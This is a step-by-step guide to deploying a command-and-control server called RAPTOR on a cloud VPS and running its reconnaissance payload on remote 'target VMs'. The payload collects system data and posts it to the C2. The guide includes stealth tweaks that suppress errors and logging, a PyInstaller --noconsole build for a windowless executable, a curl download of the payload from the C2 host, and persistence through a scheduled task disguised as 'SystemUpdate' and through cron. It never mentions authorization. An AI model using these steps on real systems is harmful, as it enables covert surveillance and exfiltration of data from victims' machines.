# 🚀 RAPTOR Cloud Deployment Guide

**Deploying RAPTOR C2 Server to Cloud VPS + Running Payload on Remote VMs**

---

## 📋 Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Prerequisites](#prerequisites)
3. [VPS Setup (C2 Server)](#vps-setup-c2-server)
4. [Security Hardening](#security-hardening)
5. [Payload Configuration](#payload-configuration)
6. [Running on Target VM](#running-on-target-vm)
7. [Monitoring & Logs](#monitoring--logs)
8. [Troubleshooting](#troubleshooting)

---

## 🏗️ Architecture Overview

```
┌─────────────────────────────────────────────────────────────┐
│                   CLOUD VPS (Your Server)                   │
│  ┌───────────────────────────────────────────────────────┐  │
│  │   RAPTOR C2 Server                                    │  │
│  │   • Django on Gunicorn/uWSGI                          │  │
│  │   • Nginx reverse proxy                               │  │
│  │   • SSL/TLS (Let's Encrypt)                           │  │
│  │   • Public IP: x.x.x.x                                │  │
│  │   • Port: 443 (HTTPS)                                 │  │
│  └───────────────────────────────────────────────────────┘  │
│         ▲                                                    │
│         │ HTTPS POST /api/submit_scan/                      │
│         │                                                    │
└─────────┼────────────────────────────────────────────────────┘
          │
          │ Internet
          │
┌─────────┼────────────────────────────────────────────────────┐
│         │        Target VM (Separate System)                 │
│  ┌──────┴──────────────────────────────────────────────────┐ │
│  │   RAPTOR Payload (payload_v2.py)                        │ │
│  │   • Runs on Windows/Linux VM                            │ │
│  │   • Gathers recon data                                  │ │
│  │   • Sends to: https://your-vps.com/api/submit_scan/    │ │
│  └─────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

---

## ✅ Prerequisites

### On Your Cloud VPS:
- Ubuntu 20.04+ / Debian 11+ / CentOS 8+
- 2+ GB RAM (4 GB recommended)
- 20+ GB disk space
- Public IP address
- Domain name (optional but recommended for SSL)
- Root or sudo access

### On Target VM:
- Windows 10+ or Linux
- Python 3.10+
- Internet connectivity
- No special privileges required

---

## 🖥️ VPS Setup (C2 Server)

### Step 1: Connect to Your VPS

```bash
# SSH into your VPS
ssh root@your-vps-ip

# Or with key
ssh -i ~/.ssh/id_rsa root@your-vps-ip
```

### Step 2: Update System

```bash
# Update package list
sudo apt update && sudo apt upgrade -y

# Install essential tools
sudo apt install -y git python3 python3-pip python3-venv nginx certbot python3-certbot-nginx
```

### Step 3: Create Application User

```bash
# Create dedicated user (security best practice)
sudo adduser raptor --disabled-password

# Switch to raptor user
sudo su - raptor
```

### Step 4: Clone and Setup RAPTOR

```bash
# Clone your repository
cd /home/raptor
git clone https://github.com/yourusername/raptor.git
cd raptor

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
pip install gunicorn psycopg2-binary  # Production server
```

### Step 5: Configure Django for Production

Create production settings file:

```bash
cd src/c2/c2
nano settings_production.py
```

**Content of `settings_production.py`:**

```python
from .settings import *
import os

# SECURITY SETTINGS
DEBUG = False
ALLOWED_HOSTS = [
    'your-vps-ip',           # Your VPS IP
    'your-domain.com',       # Your domain (if you have one)
    'www.your-domain.com',
]

# Use environment variable for secret key
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY', 'change-this-in-production')

# Database (optional: upgrade to PostgreSQL for production)
# DATABASES = {
#     'default': {
#         'ENGINE': 'django.db.backends.postgresql',
#         'NAME': 'raptor_db',
#         'USER': 'raptor_user',
#         'PASSWORD': os.environ.get('DB_PASSWORD'),
#         'HOST': 'localhost',
#         'PORT': '5432',
#     }
# }

# Static files
STATIC_ROOT = '/home/raptor/raptor/src/c2/staticfiles/'
STATIC_URL = '/static/'

# Security headers
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'

# HTTPS settings (enable after SSL setup)
# SECURE_SSL_REDIRECT = True
# SESSION_COOKIE_SECURE = True
# CSRF_COOKIE_SECURE = True

# CORS settings for API
CORS_ALLOWED_ORIGINS = [
    "https://your-domain.com",
]

# Logging
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'handlers': {
        'file': {
            'level': 'INFO',
            'class': 'logging.FileHandler',
            'filename': '/home/raptor/raptor/logs/django.log',
        },
    },
    'loggers': {
        'django': {
            'handlers': ['file'],
            'level': 'INFO',
            'propagate': True,
        },
    },
}
```

### Step 6: Prepare Django Application

```bash
# Create logs directory
mkdir -p /home/raptor/raptor/logs

# Run migrations
cd /home/raptor/raptor/src/c2
source ../../venv/bin/activate
export DJANGO_SETTINGS_MODULE=c2.settings_production
python manage.py migrate

# Collect static files
python manage.py collectstatic --noinput

# Create superuser (for admin access)
python manage.py createsuperuser
```

### Step 7: Setup Gunicorn (WSGI Server)

Create Gunicorn config:

```bash
nano /home/raptor/raptor/gunicorn_config.py
```

**Content:**

```python
import multiprocessing

bind = "127.0.0.1:8000"
workers = multiprocessing.cpu_count() * 2 + 1
worker_class = "sync"
worker_connections = 1000
timeout = 120
keepalive = 5

# Logging
accesslog = "/home/raptor/raptor/logs/gunicorn_access.log"
errorlog = "/home/raptor/raptor/logs/gunicorn_error.log"
loglevel = "info"

# Process naming
proc_name = "raptor_c2"

# Server mechanics
daemon = False
pidfile = "/home/raptor/raptor/gunicorn.pid"
```

Create systemd service file:

```bash
# Exit raptor user, return to root
exit

# Create service file
sudo nano /etc/systemd/system/raptor.service
```

**Content:**

```ini
[Unit]
Description=RAPTOR C2 Server (Gunicorn)
After=network.target

[Service]
Type=notify
User=raptor
Group=raptor
WorkingDirectory=/home/raptor/raptor/src/c2
Environment="PATH=/home/raptor/raptor/venv/bin"
Environment="DJANGO_SETTINGS_MODULE=c2.settings_production"
Environment="DJANGO_SECRET_KEY=your-super-secret-key-here-change-this"
ExecStart=/home/raptor/raptor/venv/bin/gunicorn \
    --config /home/raptor/raptor/gunicorn_config.py \
    c2.wsgi:application
ExecReload=/bin/kill -s HUP $MAINPID
KillMode=mixed
TimeoutStopSec=5
PrivateTmp=true
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Enable and start the service:

```bash
# Reload systemd
sudo systemctl daemon-reload

# Enable auto-start on boot
sudo systemctl enable raptor

# Start the service
sudo systemctl start raptor

# Check status
sudo systemctl status raptor
```

### Step 8: Configure Nginx Reverse Proxy

```bash
sudo nano /etc/nginx/sites-available/raptor
```

**Content:**

```nginx
upstream raptor_server {
    server 127.0.0.1:8000;
}

server {
    listen 80;
    server_name your-vps-ip your-domain.com;

    client_max_body_size 50M;

    # Logging
    access_log /var/log/nginx/raptor_access.log;
    error_log /var/log/nginx/raptor_error.log;

    # Static files
    location /static/ {
        alias /home/raptor/raptor/src/c2/staticfiles/;
    }

    # Media files (reports)
    location /media/ {
        alias /home/raptor/raptor/src/c2/media/;
    }

    # Proxy to Django
    location / {
        proxy_pass http://raptor_server;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_redirect off;
        
        # Timeout settings
        proxy_connect_timeout 300s;
        proxy_send_timeout 300s;
        proxy_read_timeout 300s;
    }
}
```

Enable the site:

```bash
# Create symlink
sudo ln -s /etc/nginx/sites-available/raptor /etc/nginx/sites-enabled/

# Remove default site
sudo rm /etc/nginx/sites-enabled/default

# Test nginx config
sudo nginx -t

# Restart nginx
sudo systemctl restart nginx
```

### Step 9: Setup SSL/TLS (HTTPS) - Optional but Recommended

**If you have a domain:**

```bash
# Get SSL certificate from Let's Encrypt
sudo certbot --nginx -d your-domain.com -d www.your-domain.com

# Follow prompts, choose redirect HTTP to HTTPS
```

**After SSL setup, update Django settings:**

```bash
sudo su - raptor
cd raptor/src/c2/c2
nano settings_production.py
```

Uncomment these lines:

```python
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
```

Restart services:

```bash
exit  # Back to root
sudo systemctl restart raptor
sudo systemctl restart nginx
```

### Step 10: Configure Firewall

```bash
# Allow SSH (IMPORTANT!)
sudo ufw allow 22/tcp

# Allow HTTP and HTTPS
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Enable firewall
sudo ufw enable

# Check status
sudo ufw status
```

---

## 🔒 Security Hardening

### 1. Generate Strong Secret Key

```bash
python3 -c 'from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())'
```

Update in `/etc/systemd/system/raptor.service`

### 2. Disable Directory Listing

Already handled in nginx config above.

### 3. Rate Limiting (Optional)

Add to nginx config inside `location /`:

```nginx
# Rate limiting
limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;
limit_req zone=api_limit burst=20 nodelay;
```

### 4. IP Whitelisting (Optional)

If you know the IP of your target VMs:

```nginx
# Allow specific IPs only
allow 1.2.3.4;     # Your target VM IP
allow 5.6.7.8;     # Another authorized IP
deny all;
```

### 5. Setup Fail2Ban

```bash
sudo apt install fail2ban -y

# Configure
sudo nano /etc/fail2ban/jail.local
```

Add:

```ini
[nginx-http-auth]
enabled = true

[nginx-noscript]
enabled = true
```

Restart:

```bash
sudo systemctl restart fail2ban
```

---

## 🎯 Payload Configuration

### Modify Payload for Cloud C2

Edit `src/core/payload_v2.py` on your **local machine** or **target VM**:

```python
# Find this line (around line 380):
c2_url = "http://127.0.0.1:8000/api/submit_scan/"

# Change to your VPS:
c2_url = "https://your-domain.com/api/submit_scan/"
# OR
c2_url = "http://your-vps-ip/api/submit_scan/"
```

### Create Standalone Payload Script

For easier deployment to target VMs, create a standalone version:

```bash
# On your VPS or local machine
cd /home/raptor/raptor
nano standalone_payload.py
```

Copy the entire content of `src/core/payload_v2.py` and change:

1. **C2 URL** to your VPS address
2. **Remove** or reduce logging verbosity
3. **Add** error suppression for stealth (optional)

Example modification:

```python
# At the top
C2_SERVER = "https://your-domain.com"  # Your VPS
C2_ENDPOINT = f"{C2_SERVER}/api/submit_scan/"

# Change logging level for stealth
logging.basicConfig(
    level=logging.ERROR,  # Only show errors
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("recon.log")]  # Log to file
)
```

---

## 🚀 Running on Target VM

### Method 1: Direct Python Execution

**On target VM:**

```bash
# Install Python if needed
# Windows: Download from python.org
# Linux: sudo apt install python3 python3-pip

# Install dependencies
pip3 install psutil requests

# Download payload
# Option A: Clone repo
git clone https://github.com/yourusername/raptor.git
cd raptor/src/core

# Option B: Direct download
curl -O https://your-domain.com/static/payload_v2.py

# Edit C2 URL
nano payload_v2.py
# Change: c2_url = "https://your-domain.com/api/submit_scan/"

# Run payload
python3 payload_v2.py
```

### Method 2: Compiled Executable (Windows)

**On your development machine:**

```bash
# Install PyInstaller
pip install pyinstaller

# Create executable
cd src/core
pyinstaller --onefile --noconsole payload_v2.py

# Output: dist/payload_v2.exe
```

**Transfer to target VM and run:**

```bash
# On Windows target VM
payload_v2.exe
```

### Method 3: Scheduled Execution

**Windows:**

```batch
# Create scheduled task
schtasks /create /tn "SystemUpdate" /tr "C:\path\to\payload_v2.exe" /sc daily /st 09:00
```

**Linux:**

```bash
# Add to crontab
crontab -e

# Run daily at 9 AM
0 9 * * * python3 /path/to/payload_v2.py
```

---

## 📊 Monitoring & Logs

### Check C2 Server Logs

```bash
# Gunicorn logs
tail -f /home/raptor/raptor/logs/gunicorn_access.log
tail -f /home/raptor/raptor/logs/gunicorn_error.log

# Django logs
tail -f /home/raptor/raptor/logs/django.log

# Nginx logs
sudo tail -f /var/log/nginx/raptor_access.log
sudo tail -f /var/log/nginx/raptor_error.log

# System service logs
sudo journalctl -u raptor -f
```

### Monitor Sessions via API

```bash
# From any machine with curl
curl https://your-domain.com/api/session/<session-id>/ | python3 -m json.tool
```

### Admin Panel

Access Django admin at: `https://your-domain.com/admin/`

Login with superuser credentials created earlier.

---

## 🐛 Troubleshooting

### Issue: Can't Connect to C2 from Payload

**Check:**

```bash
# 1. Is Gunicorn running?
sudo systemctl status raptor

# 2. Is Nginx running?
sudo systemctl status nginx

# 3. Is firewall allowing traffic?
sudo ufw status

# 4. Test from payload VM
curl -v https://your-domain.com/api/submit_scan/

# 5. Check DNS resolution
nslookup your-domain.com
```

### Issue: 502 Bad Gateway

```bash
# Gunicorn not running
sudo systemctl restart raptor

# Check logs
sudo journalctl -u raptor -n 50
```

### Issue: 403 Forbidden

```bash
# Check Django ALLOWED_HOSTS
sudo su - raptor
cd raptor/src/c2/c2
nano settings_production.py
# Add your IP/domain to ALLOWED_HOSTS

# Restart
exit
sudo systemctl restart raptor
```

### Issue: SSL Certificate Errors

```bash
# Renew certificate
sudo certbot renew

# Check certificate
sudo certbot certificates
```

### Issue: Database Locked (SQLite)

**Solution: Upgrade to PostgreSQL for production**

```bash
# Install PostgreSQL
sudo apt install postgresql postgresql-contrib

# Create database and user
sudo -u postgres psql
CREATE DATABASE raptor_db;
CREATE USER raptor_user WITH PASSWORD 'strongpassword';
GRANT ALL PRIVILEGES ON DATABASE raptor_db TO raptor_user;
\q

# Update Django settings_production.py (uncomment PostgreSQL config)

# Migrate
cd /home/raptor/raptor/src/c2
source ../../venv/bin/activate
export DJANGO_SETTINGS_MODULE=c2.settings_production
python manage.py migrate

# Restart
sudo systemctl restart raptor
```

---

## 📋 Quick Reference

### VPS Commands

```bash
# Start C2 server
sudo systemctl start raptor

# Stop C2 server
sudo systemctl stop raptor

# Restart C2 server
sudo systemctl restart raptor

# View status
sudo systemctl status raptor

# View logs
sudo journalctl -u raptor -f
```

### Testing Connection

```bash
# From target VM (before running payload)
curl -X POST https://your-domain.com/api/submit_scan/ \
  -H "Content-Type: application/json" \
  -d '{"recon_data":{"hostname":"test","os_name":"Linux"}}'

# Should return session_id
```

---

## 🎯 Complete Deployment Checklist

- [ ] VPS provisioned with Ubuntu/Debian
- [ ] Domain name configured (optional)
- [ ] SSH access configured
- [ ] System updated
- [ ] Application user created
- [ ] RAPTOR cloned and setup
- [ ] Virtual environment created
- [ ] Dependencies installed
- [ ] Production settings configured
- [ ] Database migrated
- [ ] Static files collected
- [ ] Gunicorn configured
- [ ] Systemd service created and enabled
- [ ] Nginx configured
- [ ] SSL certificate obtained (if using domain)
- [ ] Firewall configured
- [ ] Services started
- [ ] Payload modified with VPS URL
- [ ] Test connection from target VM
- [ ] Run payload on target VM
- [ ] Verify session in admin panel
- [ ] Check generated reports

---

## 🔐 Security Recommendations

1. ✅ **Always use HTTPS** - Get free SSL from Let's Encrypt
2. ✅ **Change SECRET_KEY** - Use strong random key
3. ✅ **Whitelist IPs** - If you know target VM IPs
4. ✅ **Rate limiting** - Prevent abuse
5. ✅ **Regular updates** - Keep system and dependencies updated
6. ✅ **Backup database** - Regular automated backups
7. ✅ **Monitor logs** - Set up log rotation and monitoring
8. ✅ **Disable DEBUG** - Never run DEBUG=True in production
9. ✅ **Use PostgreSQL** - More robust than SQLite for production
10. ✅ **Fail2Ban** - Protect against brute force

---

## 📞 Support

If you encounter issues:
1. Check logs (gunicorn, nginx, django)
2. Verify firewall settings
3. Test connectivity with curl
4. Review ALLOWED_HOSTS in settings

---

**🎊 Your RAPTOR C2 is now ready for cloud deployment! 🎊**
